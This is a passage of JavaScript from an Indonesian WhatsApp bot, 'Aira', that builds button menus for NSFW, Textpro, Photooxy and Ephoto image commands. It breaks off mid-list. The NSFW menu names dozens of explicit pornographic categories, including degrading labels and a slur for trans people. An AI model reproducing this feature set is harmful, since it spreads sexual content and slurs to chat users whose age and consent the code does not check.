let teksnya= await nsfwMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Baka", "title": "Fitur baka", "id": ".baka" },
    { "header": "Smug", "title": "Fitur smug", "id": ".smug" },
    { "header": "Neko SFW", "title": "Fitur neko_sfw", "id": ".neko_sfw" },
    { "header": "Hentai GIF", "title": "Fitur hentai_gif", "id": ".hentai_gif" },
    { "header": "Spank", "title": "Fitur spank", "id": ".spank" },
    { "header": "Blowjob", "title": "Fitur blowjob", "id": ".blowjob" },
    { "header": "Cumarts", "title": "Fitur cumarts", "id": ".cumarts" },
    { "header": "Ero Yuri", "title": "Fitur eroyuri", "id": ".eroyuri" },
    { "header": "Ero Neko", "title": "Fitur eroneko", "id": ".eroneko" },
    { "header": "Ero Kemonomimi", "title": "Fitur erokemonomimi", "id": ".erokemonomimi" },
    { "header": "Ero Kitsune", "title": "Fitur erokitsune", "id": ".erokitsune" },
    { "header": "Ero", "title": "Fitur ero", "id": ".ero" },
    { "header": "Feet", "title": "Fitur feet", "id": ".feet" },
    { "header": "Ero Feet", "title": "Fitur erofeet", "id": ".erofeet" },
    { "header": "Feet GIF", "title": "Fitur feetgif", "id": ".feetgif" },
    { "header": "Femdom", "title": "Fitur femdom", "id": ".femdom" },
    { "header": "Futanari", "title": "Fitur futanari", "id": ".futanari" },
    { "header": "Hentai", "title": "Fitur hentai", "id": ".hentai" },
    { "header": "Holoero", "title": "Fitur holoero", "id": ".holoero" },
    { "header": "Holo", "title": "Fitur holo", "id": ".holo" },
    { "header": "Keta", "title": "Fitur keta", "id": ".keta" },
    { "header": "Kitsune", "title": "Fitur kitsune", "id": ".kitsune" },
    { "header": "Kemonomimi", "title": "Fitur kemonomimi", "id": ".kemonomimi" },
    { "header": "Pussy Art", "title": "Fitur pussyart", "id": ".pussyart" },
    { "header": "Pussy Wank GIF", "title": "Fitur pussywankgif", "id": ".pussywankgif" },
    { "header": "Girl Solo", "title": "Fitur girl_solo", "id": ".girl_solo" },
    { "header": "Girl Solo GIF", "title": "Fitur girl_solo_gif", "id": ".girl_solo_gif" },
    { "header": "Tits", "title": "Fitur tits", "id": ".tits" },
    { "header": "Trap", "title": "Fitur trap", "id": ".trap" },
    { "header": "Yuri", "title": "Fitur yuri", "id": ".yuri" },
    { "header": "Avatar2", "title": "Fitur avatar2", "id": ".avatar2" },
    { "header": "Anal", "title": "Fitur anal", "id": ".anal" },
    { "header": "BJ", "title": "Fitur bj", "id": ".bj" },
    { "header": "Classic", "title": "Fitur classic", "id": ".classic" },
    { "header": "Cumsluts", "title": "Fitur cumsluts", "id": ".cumsluts" },
    { "header": "Kuni", "title": "Fitur kuni", "id": ".kuni" },
    { "header": "Lesbian", "title": "Fitur lesbian", "id": ".lesbian" },
    { "header": "Neko", "title": "Fitur neko", "id": ".neko" },
    { "header": "Neko GIF", "title": "Fitur neko_gif", "id": ".neko_gif" },
    { "header": "Ahegao", "title": "Fitur ahegao", "id": ".ahegao" },
    { "header": "BDSM", "title": "Fitur bdsm", "id": ".bdsm" },
    { "header": "Cuckold", "title": "Fitur cuckold", "id": ".cuckold" },
    { "header": "Cum", "title": "Fitur cum", "id": ".cum" },
    { "header": "Foot", "title": "Fitur foot", "id": ".foot" },
    { "header": "Gangbang", "title": "Fitur gangbang", "id": ".gangbang" },
    { "header": "Glasses", "title": "Fitur glasses", "id": ".glasses" },
    { "header": "Jahy", "title": "Fitur jahy", "id": ".jahy" },
    { "header": "Masturbation", "title": "Fitur masturbation", "id": ".masturbation" },
    { "header": "NSFW Neko", "title": "Fitur nsfw_neko", "id": ".nsfw_neko" },
    { "header": "Orgy", "title": "Fitur orgy", "id": ".orgy" },
    { "header": "Panties", "title": "Fitur panties", "id": ".panties" },
    { "header": "Tentacles", "title": "Fitur tentacles", "id": ".tentacles" },
    { "header": "Thighs", "title": "Fitur thighs", "id": ".thighs" },
    { "header": "Zettai", "title": "Fitur zettai", "id": ".zettai" }
]
`
let namaMenu=`Nsfw Menu 🔞
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'textpromenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: textproMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await textproMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
  { "header": "Halloween2", "title": "Fitur halloween2", "id": ".halloween2" },
  { "header": "Horror", "title": "Fitur horror", "id": ".horror" },
  { "header": "Game8bit", "title": "Fitur game8bit", "id": ".game8bit" },
  { "header": "Layered", "title": "Fitur layered", "id": ".layered" },
  { "header": "Glitch2", "title": "Fitur glitch2", "id": ".glitch2" },
  { "header": "Coolg", "title": "Fitur coolg", "id": ".coolg" },
  { "header": "Coolwg", "title": "Fitur coolwg", "id": ".coolwg" },
  { "header": "Realistic", "title": "Fitur realistic", "id": ".realistic" },
  { "header": "Space3d", "title": "Fitur space3d", "id": ".space3d" },
  { "header": "Gtiktok", "title": "Fitur gtiktok", "id": ".gtiktok" },
  { "header": "Stone", "title": "Fitur stone", "id": ".stone" },
  { "header": "Marvel", "title": "Fitur marvel", "id": ".marvel" },
  { "header": "Pornhub", "title": "Fitur pornhub", "id": ".pornhub" },
  { "header": "Avengers", "title": "Fitur avengers", "id": ".avengers" },
  { "header": "Metalr", "title": "Fitur metalr", "id": ".metalr" },
  { "header": "Metalg", "title": "Fitur metalg", "id": ".metalg" },
  { "header": "Metalg2", "title": "Fitur metalg2", "id": ".metalg2" },
  { "header": "Lion", "title": "Fitur lion", "id": ".lion" },
  { "header": "Wolf_bw", "title": "Fitur wolf_bw", "id": ".wolf_bw" },
  { "header": "Wolf_g", "title": "Fitur wolf_g", "id": ".wolf_g" },
  { "header": "Ninja", "title": "Fitur ninja", "id": ".ninja" },
  { "header": "3dsteel", "title": "Fitur 3dsteel", "id": ".3dsteel" },
  { "header": "Horror2", "title": "Fitur horror2", "id": ".horror2" },
  { "header": "Lava", "title": "Fitur lava", "id": ".lava" },
  { "header": "Bagel", "title": "Fitur bagel", "id": ".bagel" },
  { "header": "Blackpink", "title": "Fitur blackpink", "id": ".blackpink" },
  { "header": "Rainbow2", "title": "Fitur rainbow2", "id": ".rainbow2" },
  { "header": "Water_pipe", "title": "Fitur water_pipe", "id": ".water_pipe" },
  { "header": "Halloween", "title": "Fitur halloween", "id": ".halloween" },
  { "header": "Sketch", "title": "Fitur sketch", "id": ".sketch" },
  { "header": "Sircuit", "title": "Fitur sircuit", "id": ".sircuit" },
  { "header": "Discovery", "title": "Fitur discovery", "id": ".discovery" },
  { "header": "Metallic2", "title": "Fitur metallic2", "id": ".metallic2" },
  { "header": "Fiction", "title": "Fitur fiction", "id": ".fiction" },
  { "header": "Demon", "title": "Fitur demon", "id": ".demon" },
  { "header": "Transformer", "title": "Fitur transformer", "id": ".transformer" },
  { "header": "Berry", "title": "Fitur berry", "id": ".berry" },
  { "header": "Thunder", "title": "Fitur thunder", "id": ".thunder" },
  { "header": "3dstone", "title": "Fitur 3dstone", "id": ".3dstone" },
  { "header": "Magma", "title": "Fitur magma", "id": ".magma" },
  { "header": "Neon", "title": "Fitur neon", "id": ".neon" },
  { "header": "Glitch", "title": "Fitur glitch", "id": ".glitch" },
  { "header": "Harry_potter", "title": "Fitur harry_potter", "id": ".harry_potter" },
  { "header": "Embossed", "title": "Fitur embossed", "id": ".embossed" },
  { "header": "Broken", "title": "Fitur broken", "id": ".broken" },
  { "header": "Papercut", "title": "Fitur papercut", "id": ".papercut" },
  { "header": "Gradient", "title": "Fitur gradient", "id": ".gradient" },
  { "header": "Glossy", "title": "Fitur glossy", "id": ".glossy" },
  { "header": "Watercolor", "title": "Fitur watercolor", "id": ".watercolor" },
  { "header": "Multicolor", "title": "Fitur multicolor", "id": ".multicolor" },
  { "header": "Neon_devil", "title": "Fitur neon_devil", "id": ".neon_devil" },
  { "header": "Underwater", "title": "Fitur underwater", "id": ".underwater" },
  { "header": "Bear", "title": "Fitur bear", "id": ".bear" },
  { "header": "Wonderfulg", "title": "Fitur wonderfulg", "id": ".wonderfulg" },
  { "header": "Christmas", "title": "Fitur christmas", "id": ".christmas" },
  { "header": "Neon_light", "title": "Fitur neon_light", "id": ".neon_light" },
  { "header": "Snow", "title": "Fitur snow", "id": ".snow" },
  { "header": "Cloudsky", "title": "Fitur cloudsky", "id": ".cloudsky" },
  { "header": "Luxury2", "title": "Fitur luxury2", "id": ".luxury2" },
  { "header": "Gradient2", "title": "Fitur gradient2", "id": ".gradient2" },
  { "header": "Summer", "title": "Fitur summer", "id": ".summer" },
  { "header": "Writing", "title": "Fitur writing", "id": ".writing" },
  { "header": "Engraved", "title": "Fitur engraved", "id": ".engraved" },
  { "header": "Summery", "title": "Fitur summery", "id": ".summery" },
  { "header": "3dglue", "title": "Fitur 3dglue", "id": ".3dglue" },
  { "header": "Metaldark", "title": "Fitur metaldark", "id": ".metaldark" },
  { "header": "Neonlight", "title": "Fitur neonlight", "id": ".neonlight" },
  { "header": "Oscar", "title": "Fitur oscar", "id": ".oscar" },
  { "header": "Minion", "title": "Fitur minion", "id": ".minion" },
  { "header": "Holographic", "title": "Fitur holographic", "id": ".holographic" },
  { "header": "Purple", "title": "Fitur purple", "id": ".purple" },
  { "header": "Glossyb", "title": "Fitur glossyb", "id": ".glossyb" },
  { "header": "Deluxe2", "title": "Fitur deluxe2", "id": ".deluxe2" },
  { "header": "Glossyc", "title": "Fitur glossyc", "id": ".glossyc" },
  { "header": "Fabric", "title": "Fitur fabric", "id": ".fabric" },
  { "header": "Neonc", "title": "Fitur neonc", "id": ".neonc" },
  { "header": "Newyear", "title": "Fitur newyear", "id": ".newyear" },
  { "header": "Newyear2", "title": "Fitur newyear2", "id": ".newyear2" },
  { "header": "Xmas", "title": "Fitur xmas", "id": ".xmas" },
  { "header": "Metals", "title": "Fitur metals", "id": ".metals" },
  { "header": "Blood", "title": "Fitur blood", "id": ".blood" },
  { "header": "Darkg", "title": "Fitur darkg", "id": ".darkg" },
  { "header": "Joker", "title": "Fitur joker", "id": ".joker" },
  { "header": "Wicker", "title": "Fitur wicker", "id": ".wicker" },
  { "header": "Natural", "title": "Fitur natural", "id": ".natural" },
  { "header": "Firework", "title": "Fitur firework", "id": ".firework" },
  { "header": "Skeleton", "title": "Fitur skeleton", "id": ".skeleton" },
  { "header": "Balloon", "title": "Fitur balloon", "id": ".balloon" },
  { "header": "Balloon2", "title": "Fitur balloon2", "id": ".balloon2" },
  { "header": "Balloon3", "title": "Fitur balloon3", "id": ".balloon3" },
  { "header": "Balloon4", "title": "Fitur balloon4", "id": ".balloon4" },
  { "header": "Balloon5", "title": "Fitur balloon5", "id": ".balloon5" },
  { "header": "Balloon6", "title": "Fitur balloon6", "id": ".balloon6" },
  { "header": "Balloon7", "title": "Fitur balloon7", "id": ".balloon7" },
  { "header": "Steel", "title": "Fitur steel", "id": ".steel" },
  { "header": "Gloss", "title": "Fitur gloss", "id": ".gloss" },
  { "header": "Denim", "title": "Fitur denim", "id": ".denim" },
  { "header": "Decorate", "title": "Fitur decorate", "id": ".decorate" },
  { "header": "Decorate2", "title": "Fitur decorate2", "id": ".decorate2" },
  { "header": "Peridot", "title": "Fitur peridot", "id": ".peridot" },
  { "header": "Rock", "title": "Fitur rock", "id": ".rock" },
  { "header": "Glass", "title": "Fitur glass", "id": ".glass" },
  { "header": "Glass2", "title": "Fitur glass2", "id": ".glass2" },
  { "header": "Glass3", "title": "Fitur glass3", "id": ".glass3" },
  { "header": "Glass4", "title": "Fitur glass4", "id": ".glass4" },
  { "header": "Glass5", "title": "Fitur glass5", "id": ".glass5" },
  { "header": "Glass6", "title": "Fitur glass6", "id": ".glass6" },
  { "header": "Glass7", "title": "Fitur glass7", "id": ".glass7" },
  { "header": "Glass8", "title": "Fitur glass8", "id": ".glass8" },
  { "header": "Captain_as2", "title": "Fitur captain_as2", "id": ".captain_as2" },
  { "header": "Robot", "title": "Fitur robot", "id": ".robot" },
  { "header": "Equalizer", "title": "Fitur equalizer", "id": ".equalizer" },
  { "header": "Toxic", "title": "Fitur toxic", "id": ".toxic" },
  { "header": "Sparkling", "title": "Fitur sparkling", "id": ".sparkling" },
  { "header": "Sparkling2", "title": "Fitur sparkling2", "id": ".sparkling2" },
  { "header": "Sparkling3", "title": "Fitur sparkling3", "id": ".sparkling3" },
  { "header": "Sparkling4", "title": "Fitur sparkling4", "id": ".sparkling4" },
  { "header": "Sparkling5", "title": "Fitur sparkling5", "id": ".sparkling5" },
  { "header": "Sparkling6", "title": "Fitur sparkling6", "id": ".sparkling6" },
  { "header": "Sparkling7", "title": "Fitur sparkling7", "id": ".sparkling7" },
  { "header": "Decorative", "title": "Fitur decorative", "id": ".decorative" },
  { "header": "Chocolate", "title": "Fitur chocolate", "id": ".chocolate" },
  { "header": "Strawberry", "title": "Fitur strawberry", "id": ".strawberry" },
  { "header": "Koifish", "title": "Fitur koifish", "id": ".koifish" },
  { "header": "Bread", "title": "Fitur bread", "id": ".bread" },
  { "header": "Matrix", "title": "Fitur matrix", "id": ".matrix" },
  { "header": "Blood2", "title": "Fitur blood2", "id": ".blood2" },
  { "header": "Neonligth2", "title": "Fitur neonligth2", "id": ".neonligth2" },
  { "header": "Thunder2", "title": "Fitur thunder2", "id": ".thunder2" },
  { "header": "3dbox", "title": "Fitur 3dbox", "id": ".3dbox" },
  { "header": "Neon2", "title": "Fitur neon2", "id": ".neon2" },
  { "header": "Roadw", "title": "Fitur roadw", "id": ".roadw" },
  { "header": "Bokeh", "title": "Fitur bokeh", "id": ".bokeh" },
  { "header": "Gneon", "title": "Fitur gneon", "id": ".gneon" },
  { "header": "Advanced", "title": "Fitur advanced", "id": ".advanced" },
  { "header": "Dropwater", "title": "Fitur dropwater", "id": ".dropwater" },
  { "header": "Wall", "title": "Fitur wall", "id": ".wall" },
  { "header": "Chrismast", "title": "Fitur chrismast", "id": ".chrismast" },
  { "header": "Honey", "title": "Fitur honey", "id": ".honey" },
  { "header": "Drug", "title": "Fitur drug", "id": ".drug" },
  { "header": "Marble", "title": "Fitur marble", "id": ".marble" },
  { "header": "Marble2", "title": "Fitur marble2", "id": ".marble2" },
  { "header": "Ice", "title": "Fitur ice", "id": ".ice" },
  { "header": "Juice", "title": "Fitur juice", "id": ".juice" },
  { "header": "Rusty", "title": "Fitur rusty", "id": ".rusty" },
  { "header": "Abstra", "title": "Fitur abstra", "id": ".abstra" },
  { "header": "Biscuit", "title": "Fitur biscuit", "id": ".biscuit" },
  { "header": "Wood", "title": "Fitur wood", "id": ".wood" },
  { "header": "Scifi", "title": "Fitur scifi", "id": ".scifi" },
  { "header": "Metalr", "title": "Fitur metalr", "id": ".metalr" },
  { "header": "Purpleg", "title": "Fitur purpleg", "id": ".purpleg" },
  { "header": "Shiny", "title": "Fitur shiny", "id": ".shiny" },
  { "header": "Jewelry", "title": "Fitur jewelry", "id": ".jewelry" },
  { "header": "Jewelry2", "title": "Fitur jewelry2", "id": ".jewelry2" },
  { "header": "Jewelry3", "title": "Fitur jewelry3", "id": ".jewelry3" },
  { "header": "Jewelry4", "title": "Fitur jewelry4", "id": ".jewelry4" },
  { "header": "Jewelry5", "title": "Fitur jewelry5", "id": ".jewelry5" },
  { "header": "Jewelry6", "title": "Fitur jewelry6", "id": ".jewelry6" },
  { "header": "Jewelry7", "title": "Fitur jewelry7", "id": ".jewelry7" },
  { "header": "Jewelry8", "title": "Fitur jewelry8", "id": ".jewelry8" },
  { "header": "Metalh", "title": "Fitur metalh", "id": ".metalh" },
  { "header": "Golden", "title": "Fitur golden", "id": ".golden" },
  { "header": "Glitter", "title": "Fitur glitter", "id": ".glitter" },
  { "header": "Glitter2", "title": "Fitur glitter2", "id": ".glitter2" },
  { "header": "Glitter3", "title": "Fitur glitter3", "id": ".glitter3" },
  { "header": "Glitter4", "title": "Fitur glitter4", "id": ".glitter4" },
  { "header": "Glitter5", "title": "Fitur glitter5", "id": ".glitter5" },
  { "header": "Glitter6", "title": "Fitur glitter6", "id": ".glitter6" },
  { "header": "Glitter7", "title": "Fitur glitter7", "id": ".glitter7" },
  { "header": "Metale", "title": "Fitur metale", "id": ".metale" },
  { "header": "Carbon", "title": "Fitur carbon", "id": ".carbon" },
  { "header": "Candy", "title": "Fitur candy", "id": ".candy" },
  { "header": "Metalb", "title": "Fitur metalb", "id": ".metalb" },
  { "header": "Gemb", "title": "Fitur gemb", "id": ".gemb" },
  { "header": "3dchrome", "title": "Fitur 3dchrome", "id": ".3dchrome" },
  { "header": "Metalb2", "title": "Fitur metalb2", "id": ".metalb2" },
  { "header": "Metalg", "title": "Fitur metalg", "id": ".metalg" }
]
`
let namaMenu=`Textpro Menu 🌅
`
await sendButMenu(teksnya,json,namaMenu)


Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'photooxymenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: photooxyMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await photooxyMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
  { "header": "Typography Flower", "title": "Fitur typography-flower", "id": ".typography-flower" },
  { "header": "Under Flower", "title": "Fitur under-flower", "id": ".under-flower" },
  { "header": "Bevel Text", "title": "Fitur bevel-text", "id": ".bevel-text" },
  { "header": "Silk Text", "title": "Fitur silk-text", "id": ".silk-text" },
  { "header": "Smoke Typography", "title": "Fitur smoke-typography", "id": ".smoke-typography" },
  { "header": "Carvedwood", "title": "Fitur carvedwood", "id": ".carvedwood" },
  { "header": "Scary Cemetery", "title": "Fitur scary-cemetery", "id": ".scary-cemetery" },
  { "header": "Royallook", "title": "Fitur royallook", "id": ".royallook" },
  { "header": "Coffeecup2", "title": "Fitur coffeecup2", "id": ".coffeecup2" },
  { "header": "Illuminated", "title": "Fitur illuminated", "id": ".illuminated" },
  { "header": "Harry Potter2", "title": "Fitur harry-potter2", "id": ".harry-potter2" },
  { "header": "Woodblack", "title": "Fitur woodblack", "id": ".woodblack" },
  { "header": "Butterfly Reflection", "title": "Fitur butterfly-reflection", "id": ".butterfly-reflection" },
  { "header": "Watermelon", "title": "Fitur watermelon", "id": ".watermelon" },
  { "header": "Striking", "title": "Fitur striking", "id": ".striking" },
  { "header": "Metallicglow", "title": "Fitur metallicglow", "id": ".metallicglow" },
  { "header": "Rainbow Text", "title": "Fitur rainbow-text", "id": ".rainbow-text" },
  { "header": "Birthday Cake", "title": "Fitur birthday-cake", "id": ".birthday-cake" },
  { "header": "Embroidery", "title": "Fitur embroidery", "id": ".embroidery" },
  { "header": "Crisp", "title": "Fitur crisp", "id": ".crisp" },
  { "header": "Flaming", "title": "Fitur flaming", "id": ".flaming" },
  { "header": "Furtext", "title": "Fitur furtext", "id": ".furtext" },
  { "header": "Nightsky", "title": "Fitur nightsky", "id": ".nightsky" },
  { "header": "Glow Rainbow", "title": "Fitur glow-rainbow", "id": ".glow-rainbow" },
  { "header": "Gradient Avatar", "title": "Fitur gradient-avatar", "id": ".gradient-avatar" },
  { "header": "White Cube", "title": "Fitur white-cube", "id": ".white-cube" },
  { "header": "Honey Text", "title": "Fitur honey-text", "id": ".honey-text" },
  { "header": "Vintage Style", "title": "Fitur vintage-style", "id": ".vintage-style" },
  { "header": "Glowing 3d", "title": "Fitur glowing-3d", "id": ".glowing-3d" },
  { "header": "Army Camouflage", "title": "Fitur army-camouflage", "id": ".army-camouflage" },
  { "header": "Graffiti Cover", "title": "Fitur graffiti-cover", "id": ".graffiti-cover" },
  { "header": "Rainbow Shine", "title": "Fitur rainbow-shine", "id": ".rainbow-shine" },
  { "header": "Smoky Neon", "title": "Fitur smoky-neon", "id": ".smoky-neon" },
  { "header": "Quotes Underfall", "title": "Fitur quotes-underfall", "id": ".quotes-underfall" },
  { "header": "Vector Nature", "title": "Fitur vector-nature", "id": ".vector-nature" },
  { "header": "Yellow Rose", "title": "Fitur yellow-rose", "id": ".yellow-rose" },
  { "header": "Love Text", "title": "Fitur love-text", "id": ".love-text" },
  { "header": "Underwater Ocean", "title": "Fitur underwater-ocean", "id": ".underwater-ocean" },
  { "header": "Nature Text", "title": "Fitur nature-text", "id": ".nature-text" },
  { "header": "Wolf Metal", "title": "Fitur wolf-metal", "id": ".wolf-metal" },
  { "header": "Summer Text", "title": "Fitur summer-text", "id": ".summer-text" },
  { "header": "Wooden Board", "title": "Fitur wooden-board", "id": ".wooden-board" },
  { "header": "Quote Wood", "title": "Fitur quote-wood", "id": ".quote-wood" },
  { "header": "Quotes Undergrass", "title": "Fitur quotes-undergrass", "id": ".quotes-undergrass" },
  { "header": "Naruto Banner", "title": "Fitur naruto-banner", "id": ".naruto-banner" },
  { "header": "Love Message", "title": "Fitur love-message", "id": ".love-message" },
  { "header": "Textoncup2", "title": "Fitur textoncup2", "id": ".textoncup2" },
  { "header": "Burn Paper", "title": "Fitur burn-paper", "id": ".burn-paper" },
  { "header": "Smoke", "title": "Fitur smoke", "id": ".smoke" },
  { "header": "Romantic Messages", "title": "Fitur romantic-messages", "id": ".romantic-messages" },
  { "header": "Shadow Sky", "title": "Fitur shadow-sky", "id": ".shadow-sky" },
  { "header": "Text Cup", "title": "Fitur text-cup", "id": ".text-cup" },
  { "header": "Coffecup", "title": "Fitur coffecup", "id": ".coffecup" },
  { "header": "Battlegrounds Logo", "title": "Fitur battlegrounds-logo", "id": ".battlegrounds-logo" },
  { "header": "Battlefield4", "title": "Fitur battlefield4", "id": ".battlefield4" },
  { "header": "Text 8bit", "title": "Fitur text-8bit", "id": ".text-8bit" }
]
`
let namaMenu=`Photooxy Menu 🌅
`
await sendButMenu(teksnya,json,namaMenu)


Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'ephotomenu': case 'ephoto360menu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: ephotoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await ephotoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
  { "header": "1917text", "title": "Fitur 1917text", "id": ".1917text" },
  { "header": "angelwing", "title": "Fitur angelwing", "id": ".angelwing" },
  { "header": "announofwin", "title": "Fitur announofwin", "id": ".announofwin" },
  { "header": "birthdaycake", "title": "Fitur birthdaycake", "id": ".birthdaycake" },
  { "header": "capercut", "title": "Fitur capercut", "id": ".capercut" },
  { "header": "cardhalloween", "title": "Fitur cardhalloween", "id": ".cardhalloween" },
  { "header": "christmascard", "title": "Fitur christmascard", "id": ".christmascard" },
  { "header": "christmasseason", "title": "Fitur christmasseason", "id": ".christmasseason" },
  { "header": "covergamepubg", "title": "Fitur covergamepubg", "id": ".covergamepubg" },
  { "header": "covergraffiti", "title": "Fitur covergraffiti", "id": ".covergraffiti" },
  { "header": "dragonfire", "title": "Fitur dragonfire", "id": ".dragonfire" },
  { "header": "embroider", "title": "Fitur embroider", "id": ".embroider" },
  { "header": "fabrictext", "title": "Fitur fabrictext", "id": ".fabrictext" },
  { "header": "facebookgold", "title": "Fitur facebookgold", "id": ".facebookgold" },
  { "header": "facebooksilver", "title": "Fitur facebooksilver", "id": ".facebooksilver" },
  { "header": "funnyanimations", "title": "Fitur funnyanimations", "id": ".funnyanimations" },
  { "header": "funnyhalloween", "title": "Fitur funnyhalloween", "id": ".funnyhalloween" },
  { "header": "galaxybat", "title": "Fitur galaxybat", "id": ".galaxybat" },
  { "header": "galaxywallpaper", "title": "Fitur galaxywallpaper", "id": ".galaxywallpaper" },
  { "header": "generalexam", "title": "Fitur generalexam", "id": ".generalexam" },
  { "header": "glowingtext", "title": "Fitur glowingtext", "id": ".glowingtext" },
  { "header": "graffiti3d", "title": "Fitur graffiti3d", "id": ".graffiti3d" },
  { "header": "graffititext", "title": "Fitur graffititext", "id": ".graffititext" },
  { "header": "graffititext2", "title": "Fitur graffititext2", "id": ".graffititext2" },
  { "header": "graffititext3", "title": "Fitur graffititext3", "id": ".graffititext3" },
  { "header": "greetingcardvideo", "title": "Fitur greetingcardvideo", "id": ".greetingcardvideo" },
  { "header": "halloweenbats", "title": "Fitur halloweenbats", "id": ".halloweenbats" },
  { "header": "heartcup", "title": "Fitur heartcup", "id": ".heartcup" },
  { "header": "heartflashlight", "title": "Fitur heartflashlight", "id": ".heartflashlight" },
  { "header": "horrorletter", "title": "Fitur horrorletter", "id": ".horrorletter" },
  { "header": "icetext", "title": "Fitur icetext", "id": ".icetext" },
  { "header": "instagramgold", "title": "Fitur instagramgold", "id": ".instagramgold" },
  { "header": "instagramsilver", "title": "Fitur instagramsilver", "id": ".instagramsilver" },
  { "header": "lightningpubg", "title": "Fitur lightningpubg", "id": ".lightningpubg" },
  { "header": "lovecard", "title": "Fitur lovecard", "id": ".lovecard" },
  { "header": "lovelycute", "title": "Fitur lovelycute", "id": ".lovelycute" },
  { "header": "masteryavatar", "title": "Fitur masteryavatar", "id": ".masteryavatar" },
  { "header": "merrycard", "title": "Fitur merrycard", "id": ".merrycard" },
  { "header": "messagecoffee", "title": "Fitur messagecoffee", "id": ".messagecoffee" },
  { "header": "metalstar", "title": "Fitur metalstar", "id": ".metalstar" },
  { "header": "milkcake", "title": "Fitur milkcake", "id": ".milkcake" },
  { "header": "moderngold", "title": "Fitur moderngold", "id": ".moderngold" },
  { "header": "moderngold2", "title": "Fitur moderngold2", "id": ".moderngold2" },
  { "header": "modengold3", "title": "Fitur modengold3", "id": ".modengold3" },
  { "header": "moderngoldsilver", "title": "Fitur moderngoldsilver", "id": ".moderngoldsilver" },
  { "header": "nameonheart", "title": "Fitur nameonheart", "id": ".nameonheart" },
  { "header": "noeltext", "title": "Fitur noeltext", "id": ".noeltext" },
  { "header": "projectyasuo", "title": "Fitur projectyasuo", "id": ".projectyasuo" },
  { "header": "pubgbirthday", "title": "Fitur pubgbirthday", "id": ".pubgbirthday" },
  { "header": "pubgglicthvideo", "title": "Fitur pubgglicthvideo", "id": ".pubgglicthvideo" },
  { "header": "pubgmascotlogo", "title": "Fitur pubgmascotlogo", "id": ".pubgmascotlogo" },
  { "header": "puppycute", "title": "Fitur puppycute", "id": ".puppycute" },
  { "header": "realembroidery", "title": "Fitur realembroidery", "id": ".realembroidery" },
  { "header": "retrotext", "title": "Fitur retrotext", "id": ".retrotext" },
  { "header": "rosebirthday", "title": "Fitur rosebirthday", "id": ".rosebirthday" },
  { "header": "snowontext", "title": "Fitur snowontext", "id": ".snowontext" },
  { "header": "starsnight", "title": "Fitur starsnight", "id": ".starsnight" },
  { "header": "summerbeach", "title": "Fitur summerbeach", "id": ".summerbeach" },
  { "header": "sunglightshadow", "title": "Fitur sunglightshadow", "id": ".sunglightshadow" },
  { "header": "textcakes", "title": "Fitur textcakes", "id": ".textcakes" },
  { "header": "texthalloween", "title": "Fitur texthalloween", "id": ".texthalloween" },
  { "header": "textonglass", "title": "Fitur textonglass", "id": ".textonglass" },
  { "header": "textsky", "title": "Fitur textsky", "id": ".textsky" },
  { "header": "thundertext", "title": "Fitur thundertext", "id": ".thundertext" },
  { "header": "twittergold", "title": "Fitur twittergold", "id": ".twittergold" },
  { "header": "twittersilver", "title": "Fitur twittersilver", "id": ".twittersilver" },
  { "header": "viettel", "title": "Fitur viettel", "id": ".viettel" },
  { "header": "vintagetelevision", "title": "Fitur vintagetelevision", "id": ".vintagetelevision" },
  { "header": "watercolor2", "title": "Fitur watercolor2", "id": ".watercolor2" },
  { "header": "womansday", "title": "Fitur womansday", "id": ".womansday" },
  { "header": "writeblood", "title": "Fitur writeblood", "id": ".writeblood" },
  { "header": "writegalaxy", "title": "Fitur writegalaxy", "id": ".writegalaxy" },
  { "header": "writehorror", "title": "Fitur writehorror", "id": ".writehorror" },
  { "header": "youtubegold", "title": "Fitur youtubegold", "id": ".youtubegold" },
